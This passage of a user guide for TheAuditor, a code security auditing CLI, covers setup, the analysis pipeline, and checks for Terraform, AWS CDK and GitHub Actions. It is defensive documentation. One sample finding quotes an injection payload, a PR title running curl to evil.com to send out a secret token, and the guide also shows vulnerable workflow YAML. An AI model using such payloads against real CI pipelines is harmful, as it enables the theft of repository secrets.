# How to Use TheAuditor

This comprehensive guide covers everything you need to know about setting up, configuring, and using **TheAuditor** for code analysis and security auditing. Whether you're performing a one-time security audit or integrating continuous analysis into your development workflow, this guide will walk you through every step.

---

## Prerequisites

Before installing **TheAuditor**, ensure you have:

- **Python 3.11 or higher** (3.12+ recommended)
- **Git** (for repository operations)
- **Operating System**: Linux, macOS, or Windows with WSL

---

## Installation & Setup

### Understanding the Architecture

TheAuditor uses a **dual-environment** design:
1. **TheAuditor Installation** - The tool itself (installed once, used everywhere)
2. **Project Sandbox** - Created per-project for isolated analysis

### Step 1: Install TheAuditor Tool

**IMPORTANT**: Do NOT create a virtual environment. Use your system Python.

```bash
# Choose a permanent location for TheAuditor (NOT inside your projects)
cd ~/tools  # or C:\tools on Windows, or wherever you keep dev tools

# Clone the repository
git clone https://github.com/TheAuditorTool/Auditor.git
cd TheAuditor

# Install TheAuditor to your system
pip install -e .

# Verify the installation worked
aud --version

# All features (ML, insights) installed by default
# Activation is runtime opt-in (e.g., aud learn --enable-git)
```

**Common Mistakes to Avoid:**
- ❌ Don't create a venv before installing TheAuditor
- ❌ Don't install TheAuditor inside your project directory
- ❌ Don't run `pip install` from your project directory
- ✅ Install TheAuditor ONCE in a tools directory
- ✅ Use TheAuditor to analyze MANY projects

### Step 2: Setup Project for Analysis (MANDATORY)

**Navigate to YOUR PROJECT directory first:**

```bash
# Go to the project you want to analyze (NOT TheAuditor directory!)
cd ~/my-project-to-audit

# Create the sandboxed environment for THIS project
aud setup-ai --target .
```

This command:
- Creates **`.auditor_venv/.theauditor_tools/`** sandbox directory
- Installs **TypeScript compiler** (`tsc`) in isolation
- Installs **ESLint** and related tools
- Updates all tools to latest versions
- Configures the sandbox for TheAuditor's exclusive use

**Why is this required?**
- TheAuditor **NEVER** uses your global or project-installed tools
- Ensures reproducible results across different environments
- Prevents contamination between analysis tools and project dependencies
- **Required for TheAuditor to function at all** - not just for JavaScript/TypeScript analysis

**Expected output:**
```
Step 1: Setting up Python virtual environment...
[OK] Venv already exists: C:\Users\user\Desktop\TheAuditor\.auditor_venv
[OK] TheAuditor already installed in C:\Users\user\Desktop\TheAuditor\.auditor_venv
  Upgrading to ensure latest version...
Installing TheAuditor from C:\Users\user\Desktop\TheAuditor...
[OK] Installed TheAuditor (editable) from C:\Users\user\Desktop\TheAuditor
[OK] Executable available: C:\Users\user\Desktop\TheAuditor\.auditor_venv\Scripts\aud.exe

Installing Python linting tools...
  Checking for latest linter versions...
    [OK] Updated to latest package versions
  Installing linters from pyproject.toml...
    [OK] Python linters installed (ruff, mypy, black, bandit, pylint)

Setting up JavaScript/TypeScript tools in sandboxed environment...
  Creating sandboxed tools directory: C:\Users\user\Desktop\TheAuditor\.auditor_venv\.theauditor_tools
    [OK] ESLint v9 flat config copied to sandbox
  [Track A] Checking for latest tool versions...
  [Track B] Setting up portable Node.js runtime...
    [OK] Node.js runtime already installed at C:\Users\user\Desktop\TheAuditor\.auditor_venv\.theauditor_tools\node-runtime
      [OK] Updated @typescript-eslint/parser: 8.41.0 → ^8.42.0
      [OK] Updated @typescript-eslint/eslint-plugin: 8.41.0 → ^8.42.0
    Updated 2 packages to latest versions
  Installing JS/TS linters using bundled Node.js...
    [OK] JavaScript/TypeScript tools installed in sandbox
    [OK] Tools isolated from project: C:\Users\user\Desktop\TheAuditor\.auditor_venv\.theauditor_tools
    [OK] Using bundled Node.js - no system dependency!
    [OK] ESLint verified at: C:\Users\user\Desktop\TheAuditor\.auditor_venv\.theauditor_tools\node_modules\.bin\eslint.cmd
```

---

## Core Commands & Workflow

### Complete Audit Pipeline

**v1.2 Performance:** On a medium 20k LOC node/react/vite stack, analysis now takes ~2-5 minutes (was 10 minutes in v1.1, 30 minutes pre-v1.1).
Second run with warm caches: Near-instant for most analysis phases.
Progress bars for tracks B/C may display inconsistently on PowerShell.

Run a comprehensive audit with multiple analysis phases organized in parallel stages:

```bash
aud full

# Skip network operations (deps, docs) for faster execution
aud full --offline
```

This executes in **4-stage optimized pipeline** for maximum performance (v1.1+):

**Stage 1 - Foundation (Sequential):**
1. **Repository indexing** - Build manifest and symbol database
2. **Framework detection** - Identify technologies in use

**Stage 2 - Data Preparation (Sequential) [NEW in v1.1]:**
3. **Workset creation** - Define analysis scope
4. **Graph building** - Construct dependency graph
5. **CFG analysis** - Build control flow graphs

**Stage 3 - Heavy Parallel Analysis (3 Rebalanced Tracks):**
- **Track A (Taint Analysis - Isolated):**
  6. **Taint analysis** - Track data flow (~30 seconds with v1.2 memory cache, was 2-4 hours)
- **Track B (Static & Graph Analysis):**
  7. **Linting** - Run code quality checks
  8. **Pattern detection** - Apply security rules (355x faster with AST)
  9. **Graph analysis** - Find architectural issues
  10. **Graph visualization** - Generate multiple views
- **Track C (Network I/O):** *(skipped with --offline)*
  11. **Dependency checking** - Scan for vulnerabilities
  12. **Documentation fetching** - Gather project docs
  13. **Documentation summarization** - Create AI-friendly summaries

**Stage 4 - Final Aggregation (Sequential):**
14. **Factual correlation engine** - Correlate findings across tools with 30 advanced rules
15. **[AUTOMATIC]** Chunk extraction to readthis/ - Create AI-consumable output (<65KB chunks)
16. **Report generation** - Produce final consolidated output
17. **Summary generation** - Create executive summary

**Performance Impact:** 25-40% faster overall execution by isolating heavy taint analysis

**Output**: Complete results in **`.pf/readthis/`** directory

### Offline Mode

When working on the same codebase repeatedly or when network access is limited, use offline mode to skip network operations (dependency checking and documentation fetching):

```bash
# Run full audit without network operations
aud full --offline

# Combine with other flags
aud full --offline --quiet
aud full --offline --exclude-self  # Only meant for dogfooding; in 9/10 projects, --exclude-self will correctly exclude the entire project, producing empty results
```

**Benefits:**
- **Faster execution** - Skips slow network operations
- **Air-gapped operation** - Works without internet access
- **Iterative development** - Perfect for repeated runs during development

**What gets skipped:**
- Dependency vulnerability scanning
- Documentation fetching and summarization
- Latest version checks

**What still runs:**
- All code analysis (indexing, linting, patterns)
- Graph building and analysis
- Taint analysis and FCE
- Report generation

### Incremental Analysis (Workset-based)

Analyze only changed files based on git diff:

```bash
# Create workset from uncommitted changes
aud workset

# Create workset from specific commit range
aud workset --diff "HEAD~3..HEAD"

# Create workset for all files
aud workset --all
```

Then run targeted analysis:
```bash
aud lint --workset
aud detect-patterns --workset
```

### Linting with Auto-fix

Run comprehensive linting across all supported languages:

```bash
# Run linting on workset
aud lint --workset

# Auto-fix issues where possible
aud lint --fix

# Run on all files
aud lint --all
```

Supports:
- **Python**: **Ruff**, **MyPy**, **Black**, **Bandit**, **Pylint**
- **JavaScript/TypeScript**: **ESLint** with TypeScript parser
- **General**: **Prettier** for formatting

### Security Analysis

#### Taint Analysis

Track data flow from **sources** (user input) to **sinks** (database, output):

```bash
aud taint-analyze
```

Detects:
- **SQL injection** vulnerabilities
- **XSS** (Cross-site scripting)
- **Command injection**
- **Path traversal**
- Other injection attacks

#### Pattern Detection

**v1.2 Performance:** 355x faster using AST-based rules (10 hours → 101 seconds in v1.1). With optimized AST caching, near-instant on second run.

Run pattern-based vulnerability scanning:

```bash
aud detect-patterns
```

Uses **100+ security rules** (AST-based analysis + YAML patterns) across multiple categories:

**Security Patterns** (AST-based rules in `theauditor/rules/`):
- Hardcoded secrets and API keys
- Insecure randomness (**Math.random** for security)
- Weak cryptographic algorithms
- Authentication bypasses (JWT issues, session fixation)
- Missing authentication decorators

**Resource Management:**
- Socket, stream, and worker leaks
- File handles not closed properly
- Database connections left open
- Event listeners not removed

**Concurrency Issues:**
- **Race conditions** (check-then-act)
- **Deadlocks** (nested locks, lock ordering)
- Shared state without synchronization
- Unsafe parallel writes

**ORM & Database:**
- **Sequelize** death queries and N+1 patterns
- **Prisma** connection pool exhaustion
- **TypeORM** missing transactions
- Missing database indexes

**Deployment & Infrastructure:**
- **Docker** security misconfigurations
- **nginx** exposed paths and weak SSL
- **docker-compose** privileged containers
- **webpack** source map exposure in production

**Framework-Specific:**
- **Django**, **Flask**, **FastAPI** vulnerabilities
- **React** hooks dependency issues
- **Vue** reactivity problems
- **Angular**, **Next.js**, **Express.js** patterns
- Multi-tenant security violations

### Docker Security Analysis

Analyze Docker images for security misconfigurations and vulnerabilities:

```bash
# Analyze all indexed Docker images
aud docker-analyze

# Filter by severity level
aud docker-analyze --severity critical

# Save results to JSON file
aud docker-analyze --output docker-security.json
```

Detects:
- **Containers running as root** - CIS Docker Benchmark violation
- **Exposed secrets in ENV/ARG** - Hardcoded passwords, API keys, tokens
- **High entropy values** - Potential secrets using Shannon entropy
- **Known secret patterns** - GitHub tokens, AWS keys, Slack tokens

The command requires Docker images to be indexed first (`aud index`). It queries the `repo_index.db` for Docker metadata and performs security analysis.

### Project Structure Report

Generate comprehensive project structure and intelligence reports:

```bash
# Generate default structure report
aud structure

# Specify output location
aud structure --output PROJECT_OVERVIEW.md

# Adjust directory tree depth
aud structure --max-depth 6

# Analyze different root directory
aud structure --root ./src
```

The report includes:
- **Directory tree visualization** - Smart file grouping and critical file(size/loc) highlighting
- **Project statistics** - Total files, LOC, estimated tokens
- **Language distribution** - Percentage breakdown by file type
- **Top 10 largest files** - By token count with percentage of codebase
- **Top 15 critical files** - Identified by naming conventions (auth.py, config.js, etc.)
- **AI context optimization** - Recommendations for reading order and token budget
- **Symbol counts** - Functions, classes, imports from database

Useful for:
- Getting quick project overview
- Understanding codebase structure
- Planning AI assistant interactions
- Identifying critical components
- Token budget management for LLMs

### Impact Analysis

Assess the blast radius of a specific code change:

```bash
# Analyze impact of changes to a specific function
aud impact --file "src/auth/login.py" --line 42

# Analyze impact with depth limit
aud impact --file "src/database.py" --line 100 --depth 3

# Trace frontend to backend dependencies
aud impact --file "frontend/api.ts" --line 50 --trace-to-backend
```

Shows:
- Dependent functions and modules
- Call chain analysis
- Affected test files
- Risk assessment
- Cross-stack impact (frontend → backend tracing)

### Refactoring Analysis

Detect and analyze refactoring issues such as data model changes, API contract mismatches, and incomplete migrations:

```bash
# Analyze impact from a specific model change
aud refactor --file "models/Product.ts" --line 42

# Auto-detect refactoring from database migrations
aud refactor --auto-detect --migration-dir backend/migrations

# Analyze current workset for refactoring issues
aud refactor --workset

# Generate detailed report
aud refactor --auto-detect --output refactor_report.json
```

Detects:
- **Data Model Changes**: Fields moved between tables (e.g., `product.price` → `variant.price`)
- **Foreign Key Changes**: References updated (e.g., `product_id` → `product_variant_id`)
- **API Contract Mismatches**: Frontend expects old structure, backend provides new
- **Missing Updates**: Code still using old field/table names
- **Cross-Stack Inconsistencies**: TypeScript interfaces not matching backend models

The refactor command uses:
- Impact analysis to trace affected files
- Migration file analysis to detect schema changes
- Pattern detection with refactoring-specific rules
- FCE correlation to find related issues
- Risk assessment based on blast radius

### Insights Analysis (Optional)

Run optional interpretive analysis on top of factual audit data:

```bash
# Run all insights modules
aud insights --mode all

# ML-powered insights (runtime opt-in, installed by default)
aud learn --enable-git --print-stats

# Graph health metrics and recommendations
aud insights --mode graph

# Taint vulnerability scoring
aud insights --mode taint

# Impact analysis insights
aud insights --mode impact

# Generate comprehensive report
aud insights --output insights_report.json

# Train ML model on your codebase patterns
aud insights --mode ml --ml-train --training-data .pf/raw/

# Get ML-powered suggestions
aud insights --mode ml --ml-suggest
```

Modes:
- **ml**: Machine learning predictions and pattern recognition
- **graph**: Health scores, architectural recommendations
- **taint**: Vulnerability severity scoring and classification
- **impact**: Change impact assessment and risk scoring
- **all**: Run all available insights modules

The insights command:
- Reads existing audit data from `.pf/raw/`
- Applies interpretive scoring and classification
- Generates actionable recommendations
- Outputs to `.pf/insights/` for separation from facts
- Provides technical scoring without crossing into semantic interpretation

#### Important: Insights Requirements

**All insights modules follow strict architectural patterns:**

1. **Database-First**: Insights query `repo_index.db`, never read source files
   - Uses indexed database queries (<50ms response time)
   - Leverages data already extracted by indexer
   - Example: Impact analysis queries `function_call_args` table for API calls

2. **Zero Fallback Policy**: Missing data causes hard failure, not silent degradation
   - Forces correct pipeline execution order
   - Prevents data corruption and semantic mismatches
   - Example: ML training fails if `journal.ndjson` missing (won't fall back to FCE data)

3. **Schema Contract Compliance**: All queries validated against schema definitions
   - Adapts to schema changes (e.g., normalization with junction tables)
   - Uses `api_endpoint_controls` junction table instead of removed `controls` column
   - Validated at runtime to prevent stale queries

**Prerequisites for Insights Modules:**

| Module | Prerequisites | Why |
|--------|---------------|-----|
| **ml** | `aud full` run at least once | Requires `journal.ndjson` execution history |
| **impact** | `aud index` + `aud graph build` | Queries symbols + dependency graph |
| **graph** | `aud graph build` | Analyzes dependency graph structure |
| **taint** | `aud taint-analyze` | Scores taint findings from analyzer |

**Common Errors and Solutions:**

**Error: "No journal.ndjson files found"**
```bash
# Cause: ML training requires execution history
# Solution: Run full pipeline first
aud full
aud insights --mode ml --ml-train
```

**Error: "Database not found"**
```bash
# Cause: Insights need indexed database
# Solution: Run indexing first
aud index
aud insights --mode impact
```

**Error: "Graph database not found"**
```bash
# Cause: Impact analysis needs dependency graph
# Solution: Build graph first
aud graph build
aud insights --mode impact
```

**Performance Characteristics:**
- Symbol lookups: <5ms (indexed by name)
- API call tracing: <10ms (indexed by function name)
- Cross-file analysis: <50ms (BFS with cycle detection)
- All insights use **zero file I/O** for code analysis

### Graph Visualization

Generate rich visual intelligence from dependency graphs:

```bash
# Build dependency graphs first
aud graph build

# Basic visualization
aud graph viz

# Show only dependency cycles
aud graph viz --view cycles --include-analysis

# Top 10 hotspots (most connected nodes)
aud graph viz --view hotspots --top-hotspots 10

# Architectural layers visualization
aud graph viz --view layers --format svg

# Impact analysis visualization
aud graph viz --view impact --impact-target "src/auth/login.py"

# Call graph instead of import graph
aud graph viz --graph-type call --view full

# Generate SVG for AI analysis
aud graph viz --format svg --include-analysis --title "System Architecture"

# Custom output location
aud graph viz --out-dir ./architecture/ --format png
```

View Modes:
- **full**: Complete graph with all nodes and edges
- **cycles**: Only nodes/edges involved in dependency cycles (red highlighting)
- **hotspots**: Top N most connected nodes with gradient coloring
- **layers**: Architectural layers as subgraphs with clear hierarchy
- **impact**: Highlight impact radius with color-coded upstream/downstream

Visual Encoding:
- **Node Color**: Programming language (Python=blue, JavaScript=yellow, TypeScript=blue)
- **Node Size**: Importance/connectivity (larger = more dependencies)
- **Edge Color**: Red for cycles, gray for normal dependencies
- **Border Width**: Code churn (thicker = more changes)
- **Node Shape**: Module=box, Function=ellipse, Class=diamond

The graph viz command:
- Generates Graphviz DOT format files
- Optionally creates SVG/PNG images (requires Graphviz installation)
- Supports filtered views for focusing on specific concerns
- Includes analysis data for cycle and hotspot highlighting
- Produces AI-readable SVG output for LLM analysis

### Data Flow Graph (DFG) Building

Build graph representations of how data flows through variable assignments and function returns.

```bash
# Build data flow graph (must run 'aud index' first)
aud graph build-dfg

# Specify custom database paths
aud graph build-dfg --db .pf/graphs.db --repo-db .pf/repo_index.db
```

**What it does:**
- Reads normalized junction tables (`assignment_sources`, `function_return_sources`)
- Builds graph nodes for variables and return values
- Creates edges for assignment relationships and return statements
- Writes to both `.pf/graphs.db` (database) and `.pf/raw/data_flow_graph.json` (JSON)

**Prerequisites:**
- Must run `aud index` first to populate junction tables
- Typical project creates 40k+ assignment edges and 15k+ return edges

**Output:**
```
Data Flow Graph Statistics:
  Assignment Stats:
    Total assignments: 42,844
    With source vars:  38,521
    Edges created:     38,521
  Return Stats:
    Total returns:     19,313
    With variables:    15,247
    Edges created:     15,247
  Totals:
    Total nodes:       45,892
    Total edges:       53,768

Data flow graph saved to .pf/graphs.db
Raw JSON saved to .pf/raw/data_flow_graph.json
```

**When to use:**
- Preparing for advanced taint analysis (future integration)
- Understanding data dependency chains in your codebase
- Tracking how variables flow through assignments
- Analyzing function return value propagation

**Current limitations:**
- Taint analyzer does not yet use DFG (direct query mode still used)
- DFG building can take 30-60s on large codebases (100k+ LOC)
- Graph size can be large (50k+ nodes in typical projects)

**Future enhancements:**
- Taint analyzer will use pre-built DFG for faster inter-procedural analysis
- Support for querying DFG via `aud query --show-data-flow`
- Visualization of data flow paths
- Alias analysis using assignment chains

### Terraform Infrastructure Analysis

Analyze Terraform/HCL configurations for infrastructure security issues and build provisioning flow graphs.

**Prerequisites:**
```bash
# Terraform files are automatically indexed
aud index
```

**Build Provisioning Flow Graph:**
```bash
# Build complete provisioning graph
aud terraform provision

# Build graph for changed files only
aud terraform provision --workset

# Custom output location
aud terraform provision --output ./infrastructure_graph.json
```

The provisioning graph shows:
- **Variables** (source nodes) → **Resources** (processing nodes) → **Outputs** (sink nodes)
- Variable references (var.X used in resource properties)
- Resource dependencies (explicit depends_on)
- Output references (outputs referencing resources)
- Sensitive data propagation paths
- Public exposure blast radius

**Security Analysis:**
```bash
# Detect all security issues
aud terraform analyze

# Filter by severity
aud terraform analyze --severity critical

# Check specific categories
aud terraform analyze --categories public_exposure
aud terraform analyze --categories iam_wildcard --categories hardcoded_secret

# Save findings to JSON
aud terraform analyze --output terraform_issues.json
```

**Security Checks:**

1. **Public S3 Buckets**
   - Public ACLs (public-read, public-read-write)
   - Website hosting configuration
   - Severity: HIGH/MEDIUM

2. **Unencrypted Storage**
   - RDS/Aurora databases (storage_encrypted=false)
   - EBS volumes (encrypted=false)
   - Severity: HIGH/MEDIUM

3. **IAM Wildcards**
   - Policies with Action="*" and Resource="*"
   - Overly permissive permissions
   - Severity: CRITICAL

4. **Hardcoded Secrets**
   - Sensitive properties with literal values
   - Passwords, keys, tokens not using variables
   - Severity: CRITICAL

5. **Missing Encryption**
   - SNS topics without KMS encryption
   - Resources lacking encryption configuration
   - Severity: LOW

6. **Security Groups**
   - Ingress rules from 0.0.0.0/0
   - Open ports (non-HTTP/HTTPS = HIGH, HTTP/HTTPS = MEDIUM)
   - Severity: HIGH/MEDIUM

**Example Output:**
```
Terraform Security Analysis Complete:
  Total findings: 12
  Critical: 3
  High: 6
  Medium: 2
  Low: 1

Findings by category:
  public_exposure: 4
  hardcoded_secret: 3
  iam_wildcard: 2
  missing_encryption: 2
  unencrypted_storage: 1

Sample findings (first 3):

  [CRITICAL] IAM policy 'admin-policy' uses wildcard for actions and resources
  File: vulnerable.tf:26
  Policy grants full access (*) to all resources (*). This violates principle of least privilege.

  [CRITICAL] Hardcoded secret in 'hardcoded_secret.password'
  File: vulnerable.tf:22
  Property 'password' contains a hardcoded value. Secrets should never be committed to version control.

  [HIGH] S3 bucket 'public_data' has public ACL
  File: vulnerable.tf:6
  Bucket configured with ACL 'public-read' allowing public access. This exposes data to anyone on the internet.
```

**Integration with Full Pipeline:**

Terraform analysis is automatically included in `aud full`:
```bash
aud full  # Includes terraform provision and analyze
```

**Workset Support:**
```bash
# Create workset from git diff
aud workset

# Analyze only changed Terraform files
aud terraform provision --workset
aud terraform analyze
```

**Output Locations:**
- `.pf/graphs.db` - Provisioning flow graph (queryable)
- `.pf/raw/terraform_graph.json` - Graph export (JSON)
- `.pf/raw/terraform_findings.json` - Security findings (JSON)
- `terraform_findings` table - Database findings for FCE correlation

**When to Use:**
- Infrastructure security audits
- Cloud resource provisioning reviews
- Sensitive data flow tracking in IaC
- Public exposure blast radius assessment
- Terraform security best practices validation

### AWS CDK Infrastructure Analysis

Analyze AWS Cloud Development Kit (Python, TypeScript, JavaScript) configurations for infrastructure security issues before deployment.

**Prerequisites:**
```bash
# CDK files (Python, TypeScript, JavaScript) are automatically indexed
aud index
```

**Security Analysis:**
```bash
# Detect all CDK security issues
aud cdk analyze

# Filter by severity
aud cdk analyze --severity critical

# Save findings to JSON
aud cdk analyze --format json --output cdk_issues.json
```

**Security Checks:**

1. **Public S3 Buckets**
   - Explicit `public_read_access=True`
   - Missing `block_public_access` configuration
   - Severity: CRITICAL/HIGH

2. **Unencrypted Storage**
   - RDS DatabaseInstance without `storage_encrypted`
   - EBS Volumes without `encrypted`
   - DynamoDB Tables with default encryption (not customer-managed)
   - Severity: HIGH/MEDIUM

3. **Open Security Groups**
   - Ingress rules from 0.0.0.0/0 (IPv4 unrestricted)
   - Ingress rules from ::/0 (IPv6 unrestricted)
   - `allow_all_outbound=True` (informational)
   - Severity: CRITICAL/LOW

4. **IAM Wildcard Permissions**
   - PolicyStatements with `actions=["*"]`
   - PolicyStatements with `resources=["*"]`
   - Roles with AdministratorAccess attached
   - Severity: CRITICAL/HIGH

**Example Output:**
```
CDK Security Analysis Complete:
  Total findings: 4
  Critical: 2
  High: 2
  Medium: 0
  Low: 0

Sample findings:

  [CRITICAL] S3 bucket 'PublicBucket' has public read access enabled
  File: vulnerable_stack.py:20
  Snippet: public_read_access=True
  Remediation: Remove public_read_access=True or set to False. Use bucket policies with specific principals instead.

  [HIGH] RDS instance 'UnencryptedDB' has storage encryption explicitly disabled
  File: vulnerable_stack.py:29
  Snippet: storage_encrypted=False
  Remediation: Change storage_encrypted=False to storage_encrypted=True.

  [CRITICAL] Security group 'OpenSecurityGroup' allows unrestricted ingress from 0.0.0.0/0
  File: vulnerable_stack.py:38
  Remediation: Restrict ingress to specific IP ranges or security groups. Use ec2.Peer.ipv4("10.0.0.0/8") instead of 0.0.0.0/0.

  [HIGH] IAM policy 'AdminPolicy' grants wildcard actions (*)
  File: vulnerable_stack.py:45
  Remediation: Replace wildcard actions with specific actions following least privilege principle (e.g., ["s3:GetObject", "s3:PutObject"]).
```

**Integration with Full Pipeline:**

CDK analysis is automatically included in `aud full`:
```bash
aud full  # Includes CDK analyze (Stage 2, after Terraform)
```

**Output Locations:**
- `.pf/raw/cdk_findings.json` - Security findings (JSON)
- `.pf/raw/patterns.json` - Includes CDK findings (detect-patterns integration)
- `cdk_findings` table - Database findings for FCE correlation
- `findings_consolidated` table - Cross-tool correlation with app code findings

**When to Use:**
- AWS CDK infrastructure security audits
- Pre-deployment infrastructure review
- Cloud resource misconfiguration detection
- IAM permission auditing in CDK stacks
- S3 public exposure prevention

**Detected Constructs:**
Supports both Python and TypeScript/JavaScript CDK code:
- `s3.Bucket` - S3 bucket configurations (Python + TypeScript)
- `rds.DatabaseInstance` - RDS database instances (Python + TypeScript)
- `ec2.SecurityGroup` - EC2 security groups (Python + TypeScript)
- `ec2.Volume` - EBS volumes (Python + TypeScript)
- `dynamodb.Table` - DynamoDB tables (Python + TypeScript)
- `iam.PolicyStatement` - IAM policy statements (Python + TypeScript)
- `iam.Role` - IAM roles with managed policies (Python + TypeScript)

**Language Support:**
- **Python**: Extracts from `aws_cdk.aws_*` and direct imports (CDK v2)
- **TypeScript**: Extracts from `aws-cdk-lib/aws-*` imports and `new` expressions
- **JavaScript**: Same as TypeScript (uses same extraction pipeline)

### GitHub Actions Workflow Security

Analyze GitHub Actions workflows for supply-chain vulnerabilities, privilege escalation, and CI/CD pipeline attack patterns.

**Prerequisites:**
```bash
# Workflow files are automatically indexed
aud index
```

**Security Analysis:**
```bash
# Detect all workflow security issues
aud workflows analyze

# Filter by severity
aud workflows analyze --severity critical

# Export findings to JSON
aud workflows analyze --output workflow_security.json
```

**Security Checks:**

1. **Untrusted Code Execution**
   - `pull_request_target` with early checkout of untrusted PR code
   - Checkout of `github.event.pull_request.head.sha` before validation
   - Severity: CRITICAL/HIGH

2. **Script Injection**
   - PR metadata (title, body, branch names) interpolated into shell scripts
   - github.event.* data used directly in `run:` scripts without sanitization
   - Attacker-controlled strings in bash commands
   - Severity: CRITICAL/HIGH

3. **Unpinned Actions with Secrets**
   - Mutable action versions (@main, @v1) that expose secrets
   - Third-party actions using floating tags with `secrets:` access
   - Supply chain takeover risk through action updates
   - Severity: HIGH

4. **Excessive Permissions**
   - Write permissions (`contents`, `packages`, `id-token`) in untrusted contexts
   - Overly permissive GITHUB_TOKEN in pull_request_target workflows
   - Permission escalation via workflow_dispatch
   - Severity: CRITICAL/HIGH

5. **External Workflow Risks**
   - Reusable workflows from external repos with `secrets: inherit`
   - Third-party workflows accessing organizational secrets
   - Information disclosure to external systems
   - Severity: HIGH/MEDIUM

6. **Artifact Poisoning**
   - Untrusted builds deployed without validation
   - Artifacts from pull_request_target uploaded and later deployed
   - Build artifacts from forked PRs used in production
   - Severity: CRITICAL

**Attack Patterns Covered:**

- **CWE-284**: Improper Access Control (untrusted checkout sequences)
- **CWE-829**: Untrusted Supply Chain (unpinned third-party actions)
- **CWE-77**: Command Injection (PR data in run scripts)
- **CWE-269**: Privilege Management (excessive workflow permissions)
- **CWE-200**: Information Exposure (secret leaks to external workflows)
- **CWE-494**: Integrity Check Missing (artifact poisoning chains)

**Example Output:**
```
GitHub Actions Security Analysis Complete:
  Total findings: 7
  Critical: 3
  High: 4
  Medium: 0
  Low: 0

Sample findings:

  [CRITICAL] Workflow 'CI' job 'test' step 'Checkout PR' checks out untrusted code in pull_request_target context
  File: .github/workflows/ci.yml
  Pattern: pull_request_target + early checkout
  Attack: Attacker opens PR with malicious code that executes with write permissions
  Remediation: Move checkout after validation, or use pull_request trigger instead

  [CRITICAL] Workflow 'CI' job 'test' step 'Run tests' uses untrusted data in run: script without sanitization
  File: .github/workflows/ci.yml
  Variables: github.event.pull_request.title, github.event.pull_request.body
  Attack Example: PR title "; curl http://evil.com/steal?token=$SECRET #" executes arbitrary commands
  Remediation: Pass untrusted data through environment variables, not direct interpolation

  [HIGH] Workflow 'Publish' uses unpinned action 'actions/checkout@main' with secrets access
  File: .github/workflows/publish.yml
  Risk: Action maintainer can update @main to steal NPM_TOKEN
  Remediation: Pin to full SHA (actions/checkout@a1b2c3d4...) or use verified actions only
```

**Integration with Full Pipeline:**

GitHub Actions analysis is automatically included in `aud full`:
```bash
aud full  # Includes workflow analyze (Phase 20/26, after CDK)
```

**Taint Integration:**

GitHub Actions analysis registers PR/issue data as taint sources and shell execution as sinks:
```bash
# PR data flows to shell commands detected as injection vulnerabilities
aud taint-analyze  # Includes workflow-specific taint patterns
```

Taint sources include:
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref` (branch names)
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.head_ref`

Taint sinks include:
- `run:` scripts in workflow steps
- Shell commands (bash, sh, pwsh)
- Command execution contexts

**Output Locations:**
- `.pf/raw/github_workflows.json` - Workflow structure and metadata (JSON)
- `.pf/raw/patterns.json` - Includes workflow security findings (detect-patterns integration)
- `.pf/readthis/github_workflows_*.md` - AI-optimized chunks (<65KB)
- `findings_consolidated` table - Cross-tool correlation with application code findings

**When to Use:**
- CI/CD security audits before deployment
- Supply chain security reviews
- Preventing privilege escalation in workflows
- Detecting script injection vulnerabilities
- Validating third-party action usage
- Securing artifact deployment pipelines

**Common Vulnerable Patterns:**
```yaml
# VULNERABLE: pull_request_target + early checkout
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4  # VULN: Checks out attacker code with write token

# SAFE: pull_request_target + late checkout after validation
on: pull_request_target
jobs:
  test:
    steps:
      - name: Validate PR
        run: # ... validation logic ...
      - uses: actions/checkout@v4  # Safe: After validation

# VULNERABLE: PR data in run script
- name: Comment on PR
  run: echo "PR title: ${{ github.event.pull_request.title }}"  # VULN: Injection

# SAFE: PR data via environment variables
- name: Comment on PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"  # Safe: Shell interpolation, not command injection
```

**Example Workflow Analysis:**
```bash
# 1. Index workflows
aud index

# 2. Run security analysis
aud workflows analyze --severity critical

# 3. View detailed findings
cat .pf/raw/github_workflows.json | jq '.findings[] | select(.severity=="CRITICAL")'

# 4. Check specific workflow
aud workflows analyze | grep "ci.yml"

# 5. Export for security review
aud workflows analyze --format json --output security_review.json
```

**FCE Correlation:**

Workflow findings are correlated with application code vulnerabilities by the Factual Correlation Engine:
```bash
# Example: Workflow uses unpinned npm action + package.json has vulnerable dependency
aud full  # FCE detects compound supply-chain risk
```

Correlation patterns include:
- Workflow + taint path correlation (PR data to SQL injection)
- Workflow + dependency vulnerability (unpinned action + CVE)
- Workflow + permission escalation (excessive GITHUB_TOKEN + admin API call)

### Control Flow Graph Analysis

**v1.2 Update:** CFG analysis cache expanded to 25,000 functions (was 10,000 in v1.1). JavaScript/TypeScript CFG extraction fully working since v1.1.

Analyze function-level control flow complexity and find code quality issues:

```bash
# Analyze all functions for high complexity
aud cfg analyze --complexity-threshold 10

# Find complex functions in specific file
aud cfg analyze --file src/payment.py --complexity-threshold 15

# Find dead code (unreachable blocks)
aud cfg analyze --find-dead-code

# Analyze workset files only
aud cfg analyze --workset --find-dead-code

# Save analysis results
aud cfg analyze --output cfg_analysis.json

# Visualize a specific function's control flow
aud cfg viz --file src/auth.py --function validate_token

# Generate SVG with statements shown
aud cfg viz --file src/api.py --function handle_request --format svg --show-statements

# Highlight execution paths
aud cfg viz --file src/payment.py --function process_payment --highlight-paths
```

Metrics Provided:
- **Cyclomatic Complexity**: Number of independent paths through code (McCabe complexity)
- **Decision Points**: Count of if/else, loops, try/catch blocks
- **Maximum Nesting**: Deepest level of nested control structures
- **Unreachable Code**: Dead code blocks that can never execute
- **Execution Paths**: All possible paths through a function

The CFG commands help identify:
- Functions that are too complex and need refactoring
- Dead code that can be removed
- High-risk functions with many execution paths
- Code quality issues before they become bugs

### Architectural Intelligence & Code Queries

**NEW in v1.4.2-RC1**: Blueprint, Query, and Context commands expose the indexed ground truth as an always-on code context service.

AI assistants waste 5-10k tokens per refactoring iteration reading files to understand:
- "What's the architecture? Where are boundaries?"
- "Who calls this function?"
- "What files depend on this module?"
- "Which endpoints are unprotected?"

TheAuditor's intelligence layer provides instant answers via indexed database - **zero file reads, <10ms response time**, often cutting refactor loops from ~15k tokens to ~1.5k per iteration.

#### Blueprint: Architectural Overview

Use `aud blueprint` to get a top-level view of your codebase before diving into detailed queries. Each drill-down shows exact file:line locations and actionable data.

**Top-level overview:**
```bash
# Get architectural overview with tree structure
aud blueprint
```

**Drill-downs for surgical analysis:**
```bash
